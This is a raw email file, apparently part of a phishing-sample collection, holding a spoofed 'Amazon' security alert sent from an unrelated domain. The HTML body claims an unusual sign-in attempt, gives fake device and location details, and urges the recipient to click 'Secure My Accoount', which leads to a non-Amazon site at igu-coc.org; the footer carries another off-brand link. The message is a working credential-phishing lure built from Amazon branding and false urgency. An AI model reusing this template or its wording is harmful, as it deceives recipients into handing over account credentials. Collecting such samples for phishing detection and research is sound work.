@@ -1,0 +1,244 @@
+From jose@monkey.org Mon Jul 31 19:04:50 2023 +0000
+Return-Path: sales@j-mains.asia
+Delivered-To: jose@monkey.org
+X-FDA: 81072833940.38.A9191EF
+Received: from j-mains.asia (j-mains.asia [176.126.164.217])
+	by imf30.b.hostedemail.com (Postfix) with ESMTP id D944B180010
+	for <jose@monkey.org>; Mon, 31 Jul 2023 19:04:47 +0000 (UTC)
+Authentication-Results: imf30.b.hostedemail.com;
+	dkim=pass header.d=j-mains.asia header.s=default header.b=Wi7lUUo1;
+	spf=pass (imf30.b.hostedemail.com: domain of sales@j-mains.asia designates 176.126.164.217 as permitted sender) smtp.mailfrom=sales@j-mains.asia;
+	dmarc=pass (policy=quarantine) header.from=j-mains.asia
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1690830289;
+	h=from:from:sender:reply-to:subject:subject:date:date:message-id:to:cc:
+	 mime-version:mime-version:content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=dsHA53N1kAuHGkrQ2I0QFqM2ULXFOfoEIBf8nLisSzg=;
+	b=UqoIr7YOEUnXw9DEYE/3Jy8Ys7ACBEnPtUzgd7ySAahAHtfP9J20T91ZAafbxpAR7Ld05+
+	Yh3eEpaf1sG1Rfqx094xfnVQvWcJTLUGwNAjdm67mcJckeVy4Y3I6m+rK7U52TXbN8PFo+
+	akEh0oHre3WVP3YC1m9jW+udDBHq4w8=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1690830289; a=rsa-sha256;
+	cv=none;
+	b=oDdTds3SKUin28vjkZinGy+Un0eG/JdJn6XBXDQN9/3DzbeOTTgBeQuD9XcynrYm6xM4xB
+	cjRRkkXKV4i9Hp7e3wezsff2Df06UCMmnXHC8IJBepZcc5A+iBhASAyNJs4beGaIR0V+mI
+	ToyX6sYE5YkCypn/hNKuF6E/DIDerZY=
+ARC-Authentication-Results: i=1;
+	imf30.b.hostedemail.com;
+	dkim=pass header.d=j-mains.asia header.s=default header.b=Wi7lUUo1;
+	spf=pass (imf30.b.hostedemail.com: domain of sales@j-mains.asia designates 176.126.164.217 as permitted sender) smtp.mailfrom=sales@j-mains.asia;
+	dmarc=pass (policy=quarantine) header.from=j-mains.asia
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=default; d=j-mains.asia;
+ h=From:Subject:Date:MIME-Version:Content-Type:Content-Transfer-Encoding; i=sales@j-mains.asia;
+ bh=mVx+o6e7OL5EIeJED5Xjgm7CisM=;
+ b=Wi7lUUo1seZXllvFoDZyJHb0OSC7Op5PYuk7vk6tISofRTCyrhOLSqJaL03eR0W4VQfAI0afu6TX
+   AiIRUJqkfvSudTw076DdeCRrHK14cRl3z4AC3CGZJtg1EaT6mxKm7wtM4/LbGLHqj5fIg99UACpN
+   jqxNwRjkrFJN1HZddVE=
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=default; d=j-mains.asia;
+ b=EjNtlwvRrzMFGLh9UZiYapQvpufzMDu7A3+nOmVQt3yXkVnQR8kJYlN+SjHQB9lM8fxSn9hAs+Rb
+   /hfIWtx0gk4iCoSJM0Ux+edJgUuMLMhL60Peh2uiFY41PQb3AWMwTHQvwzD9o30XZCPDD+CbXwKa
+   M+c9uDJonP93B/Xz3qM=;
+From: "Amazon"<sales@j-mains.asia>
+Subject: 'Amazon' Unusual Sign-In Attempt Detected..
+Date: Mon, 31 Jul 2023 12:04:41 -0700
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+X-Rspamd-Server: rspam03
+X-Rspamd-Queue-Id: D944B180010
+X-Stat-Signature: u38c933akoiwapcwum6yd4wiqa461nfb
+X-Rspam-User: 
+X-Spam-Status: Yes, score=29.25
+X-HE-Tag: 1690830287-662647
+X-HE-Meta: U2FsdGVkX1+QezuRx1wtkRTuwhx2LuAwxOA0WFA6dHVwiIF9xfH7UXGpjBpw5tVNDyEQgYVUoJ2itzMw3YPK9UZWfmYQEV4+lBDGj8gvw7hhvlTH/AvR4MZkUYWhv9ZvfKkBOnMeOmYLdH51HsCOLWT1ehq5KakxafjHsKcni0SS2iN3HmqyL9nuEIoCaUDplZ5V0ob2QYAVMQ4JAuReYZg5zJN3xtFo6RTveRHMW8k=
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 228
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <title>Amazon</title>
+</head>
+
+
+<body style="!important background-color: #ffcd3f; height: 100% !important; margin: 0; padding: 0; width: 100% !important;" bgcolor="#FFFFFF">
+  <!-- HIDDEN PREHEADER TEXT -->
+  <div style="color: #fefefe; display: none; font-family: Open Sans, Helvetica, Arial, sans-serif; font-size: 1px; line-height: 1px; max-height: 0px; max-width: 0px; opacity: 0; overflow: hidden;">
+      Amazon makes shopping easier!
+  </div>
+
+  <table id="main" width="100%" height="100%" cellpadding="0" cellspacing="0" border="0">
+    <tbody>
+      <tr>
+        <td valign="top" align="center" bgcolor="#fafafa" style="background: #fafafa; padding: 0 15px;">
+          <table class="innermain" cellpadding="0" width="100%" cellspacing="0" border="0" align="center" style="margin:0 auto; table-layout: fixed; border-collapse: collapse !important; max-width: 600px;">
+            <tbody>
+            <!-- START of MAIL Content -->
+              <tr>
+                <td align="center" valign="top" width="100%">
+
+                <!-- Logo start here -->
+                  <table class="logo" width="100%" cellpadding="0" cellspacing="0" border="0">
+                    <tbody>
+                      <tr><td align="center" valign="top" style="-ms-text-size-adjust: 100%; -webkit-text-size-adjust: 100%; mso-table-lspace: 0pt; mso-table-rspace: 0pt; padding: 30px 0;">
+                        <img alt="Amazon" width="150" src="http://media.corporate-ir.net/media_files/IROL/17/176060/Oct18/Amazon%20logo.PNG" />
+                      </td></tr>
+                    </tbody>
+                  </table>
+                <!-- Logo end here -->
+
+                <!-- Main CONTENT -->
+                  <table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#ffffff" style="border-radius: 4px; box-shadow: 0 2px 8px rgba(0,0,0,0.05);">
+                    <tbody>
+                      
+                      <tr>
+                        <td height="40"></td>
+                      </tr>
+                      <tr style="font-family: -apple-system,BlinkMacSystemFont,&#39;Segoe UI&#39;,&#39;Roboto&#39;,&#39;Oxygen&#39;,&#39;Ubuntu&#39;,&#39;Cantarell&#39;,&#39;Fira Sans&#39;,&#39;Droid Sans&#39;,&#39;Helvetica Neue&#39;,sans-serif; color:#4E5C6E; font-size:14px; line-height:20px; margin-top:20px;">
+                        <td class="content" colspan="2" valign="top" align="center" style="padding-left:40px; padding-right:40px;">
+
+                          <table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#ffffff">
+  <tbody>
+    <tr>
+  <td align="center" valign="bottom" colspan="2" cellpadding="3">
+   <img alt="Amazon" width="150" src="https://m.media-amazon.com/images/G/01/IS/TIV/s1gn9021HJK8SLLE274272.png" />
+  </td>
+</tr>
+
+<tr><td height="20" &nbsp;=""></td></tr>
+
+
+    <tr>
+      <td align="center">
+        <span style="color:#48545d;font-size:22px;line-height: 24px;">
+          Unusual sign-in attempt detected
+        </span>
+      </td>
+    </tr>
+
+    <tr><td height="24" &nbsp;=""></td></tr>
+<tr>
+  <td height="1" bgcolor="#DAE1E9"></td>
+</tr>
+
+<tr><td height="24" &nbsp;=""></td></tr>
+
+
+    <tr>
+      <td>
+        <span style="color:#48545d;font-size:14px;line-height:24px;">
+          Your recently attemped to sign into your Amazon.com account from a new device in new location,
+          As a security measure, we requre additional confirmation before allowing access to your Amazon.com account.<br/><br/>
+          <b>When: ##31/07/2023<br/>
+          Device: ##Windows<br/>
+          Near: ##Canada##<br/><br/></b>
+          Please confirm your account and information by clicking button below.
+        </span>
+      </td>
+    </tr>
+    <tr><td height="20" &nbsp;=""></td></tr>
+    <tr>
+      <td valign="top" width="48%" align="center">
+        <span>
+          <a href="http://igu-coc.org/v1/" style="display:block; padding:15px 25px; background-color:#ffcd3f; color:#979797; border-radius:3px; text-decoration:none;">Secure My Accoount</a>
+        </span>
+      </td>
+    </tr>
+
+    <tr><td height="20" &nbsp;=""></td></tr>
+<tr>
+  <td align="center"><img src="https://s3.amazonaws.com/app-public/Coinbase-notification/hr.png" width="54" height="2" border="0"></td>
+</tr>
+
+<tr><td height="20" &nbsp;=""></td></tr>
+
+
+    <tr>
+      <td align="center">
+        <p style="color:#a2a2a2; font-size:12px; line-height:17px; font-style:italic;">
+          If you did not sign up for this account you can ignore this email and the account will be deleted.
+        </p>
+      </td>
+    </tr>
+  </tbody>
+</table>
+
+                        </td>
+                      </tr>
+                      <tr>
+                        <td height="40"></td>
+                      </tr>
+                    </tbody>
+                  </table>
+                <!-- Main CONTENT end here -->
+
+                <!-- PROMO column start here -->
+                    <!-- Show referral promo 25% of the time-->
+                    <table id="promo" width="100%" cellpadding="0" cellspacing="0" border="0" style="margin-top:20px;">
+                      <tbody>
+                        <tr>
+                          <td colspan="2" height="20"></td>
+                        </tr>
+                        <tr>
+                          <td colspan="2" height="20"></td>
+                        </tr>
+                      </tbody>
+                    </table>
+
+                <!-- PROMO column end here -->
+
+                <!-- FOOTER start here -->
+                  <table width="100%" cellpadding="0" cellspacing="0" border="0">
+                    <tbody>
+                      <tr>
+                        <td height="10">&nbsp;</td>
+                      </tr>
+                      <tr>
+                        <td valign="top" align="center">
+                          <span style="font-family: -apple-system,BlinkMacSystemFont,&#39;Segoe UI&#39;,&#39;Roboto&#39;,&#39;Oxygen&#39;,&#39;Ubuntu&#39;,&#39;Cantarell&#39;,&#39;Fira Sans&#39;,&#39;Droid Sans&#39;,&#39;Helvetica Neue&#39;,sans-serif; color: #909090; font-size:10px; margin-bottom:5px; display:block;">
+                            <a href="https://codeunlocksource.com/v1/" target="_blank" tabindex="-1" style="font-family: -apple-system,BlinkMacSystemFont,&#39;Segoe UI&#39;,&#39;Roboto&#39;,&#39;Oxygen&#39;,&#39;Ubuntu&#39;,&#39;Cantarell&#39;,&#39;Fira Sans&#39;,&#39;Droid Sans&#39;,&#39;Helvetica Neue&#39;,sans-serif; color: #909090; font-size:10px; margin-bottom:5px; display:block;text-decoration:underline;">Terms of Service</a>
+                          </span>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td valign="top" align="center">
+                          <span style="font-family: -apple-system,BlinkMacSystemFont,&#39;Segoe UI&#39;,&#39;Roboto&#39;,&#39;Oxygen&#39;,&#39;Ubuntu&#39;,&#39;Cantarell&#39;,&#39;Fira Sans&#39;,&#39;Droid Sans&#39;,&#39;Helvetica Neue&#39;,sans-serif; color: #909090; font-size:10px;">&copy;
+                            <a href="https://www.amazon.com/" target="_blank" style="color: #909090 !important; text-decoration:none;">Amazon.com</a> 2021
+                          </span>
+                            <br/>
+                            <span style="font-family: -apple-system,BlinkMacSystemFont,&#39;Segoe UI&#39;,&#39;Roboto&#39;,&#39;Oxygen&#39;,&#39;Ubuntu&#39;,&#39;Cantarell&#39;,&#39;Fira Sans&#39;,&#39;Droid Sans&#39;,&#39;Helvetica Neue&#39;,sans-serif; color: #909090; font-size:10px;">
+                              410 Terry Avenue N  |  Seattle, WA 98109-5210  |  United State
+                            </span>
+                            <span style="font-family: -apple-system,BlinkMacSystemFont,&#39;Segoe UI&#39;,&#39;Roboto&#39;,&#39;Oxygen&#39;,&#39;Ubuntu&#39;,&#39;Cantarell&#39;,&#39;Fira Sans&#39;,&#39;Droid Sans&#39;,&#39;Helvetica Neue&#39;,sans-serif; color: #909090; font-size:10px;">&copy;
+                            <a href="https://www.amazon.com/" target="_blank" style="color: #909090 !important; text-decoration:none;">
+                              Amazon.com, Inc</a>
+                            </span>
+                            <br/>
+                            <br/>
+                            <br/>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td height="50">&nbsp;</td>
+                      </tr>
+                    </tbody>
+                  </table>
+                <!-- FOOTER end here -->
+                </td>
+              </tr>
+            </tbody>
+          </table>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</body>
+</html>
